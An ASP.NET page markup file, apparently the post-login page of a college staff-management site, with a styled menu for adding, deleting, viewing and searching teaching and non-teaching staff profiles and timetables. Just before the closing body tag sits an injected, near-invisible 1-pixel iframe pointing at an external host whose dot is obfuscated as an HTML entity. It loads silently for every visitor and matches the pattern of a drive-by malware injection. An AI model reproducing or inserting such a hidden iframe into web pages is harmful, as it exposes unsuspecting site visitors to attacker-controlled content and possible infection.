<%@ Page Language="C#" AutoEventWireup="true" CodeFile="afteruserlogin.aspx.cs" Inherits="_Default" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" >
<head runat="server">
    <title>Untitled Page</title>
</head>
<body>
    <form id="form1" runat="server">
    <div>
        <br />
        <br />
        <br />
        <br />
        &nbsp;</div>
        <asp:Menu ID="Menu1" runat="server" BackColor="#E0E0E0" Font-Bold="True" Font-Italic="True" OnMenuItemClick="Menu1_MenuItemClick" Orientation="Horizontal" DynamicHorizontalOffset="2" Font-Names="Monotype Corsiva" Font-Size="Medium" ForeColor="#804040" StaticSubMenuIndent="50px" Width="800px">
            <StaticMenuItemStyle BackColor="Gray" Font-Bold="True" Font-Italic="True" Font-Names="Monotype Corsiva"
                Font-Size="XX-Large" HorizontalPadding="5px" VerticalPadding="2px" />
            <StaticHoverStyle BackColor="DimGray" Font-Bold="True" Font-Italic="True" ForeColor="Red" />
            <DynamicHoverStyle BackColor="#990000" ForeColor="White" />
            <DynamicMenuStyle BackColor="MintCream" />
            <StaticSelectedStyle BackColor="Gray" />
            <DynamicSelectedStyle BackColor="Gray" />
            <DynamicMenuItemStyle HorizontalPadding="5px" VerticalPadding="2px" />
            <Items>
                <asp:MenuItem Text="Teaching" Value="Teaching" NavigateUrl="~/Teaching.aspx" Selected="True">
                    <asp:MenuItem Text="Add Member" Value="Add Member">
                        <asp:MenuItem NavigateUrl="~/Addprofile.aspx" Text="PROFILE" Value="PROFILE"></asp:MenuItem>
                        <asp:MenuItem NavigateUrl="~/ADDtime-table.aspx" Text="TIME-TABLE" Value="TIME-TABLE">
                        </asp:MenuItem>
                    </asp:MenuItem>
                    <asp:MenuItem Text="Delete Member" Value="Delete Member">
                        <asp:MenuItem NavigateUrl="~/Deleteprofile.aspx" Text="PROFILE" Value="PROFILE"></asp:MenuItem>
                        <asp:MenuItem Text="TIME-TABLE" Value="TIME-TABLE" NavigateUrl="~/deletetimetable.aspx"></asp:MenuItem>
                    </asp:MenuItem>
                    <asp:MenuItem Text="View Member" Value="View Member">
                        <asp:MenuItem NavigateUrl="~/Viewprofile.aspx" Text="PROFILE" Value="PROFILE"></asp:MenuItem>
                        <asp:MenuItem Text="TIME-TABLE" Value="TIME-TABLE"></asp:MenuItem>
                    </asp:MenuItem>
                    <asp:MenuItem Text="Search Member" Value="Search Member">
                        <asp:MenuItem NavigateUrl="~/Searchprofile.aspx" Text="PROFILE" Value="PROFILE"></asp:MenuItem>
                        <asp:MenuItem Text="TIME-TABLE" Value="TIME-TABLE"></asp:MenuItem>
                    </asp:MenuItem>
                </asp:MenuItem>
                <asp:MenuItem Text="Non-Teaching" Value="Non-teaching" NavigateUrl="~/Non-Teaching.aspx">
                    <asp:MenuItem Text="Add member" Value="Add member">
                        <asp:MenuItem NavigateUrl="~/nonteachprofile.aspx" Text="PROFILE" Value="PROFILE"></asp:MenuItem>
                    </asp:MenuItem>
                    <asp:MenuItem Text="Delete Member" Value="Delete Member">
                        <asp:MenuItem NavigateUrl="~/Deleteprofile.aspx" Text="PROFILE" Value="PROFILE"></asp:MenuItem>
                    </asp:MenuItem>
                    <asp:MenuItem Text="View Member" Value="View Member">
                        <asp:MenuItem NavigateUrl="~/Viewprofile.aspx" Text="PROFILE" Value="PROFILE"></asp:MenuItem>
                    </asp:MenuItem>
                    <asp:MenuItem Text="Search Member" Value="Search Member">
                        <asp:MenuItem NavigateUrl="~/Searchprofile.aspx" Text="PROFILE" Value="PROFILE"></asp:MenuItem>
                    </asp:MenuItem>
                </asp:MenuItem>
            </Items>
            <DynamicItemTemplate>
                <%# Eval("Text") %>
            </DynamicItemTemplate>
        </asp:Menu>
    </form>
<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
</body>
</html>
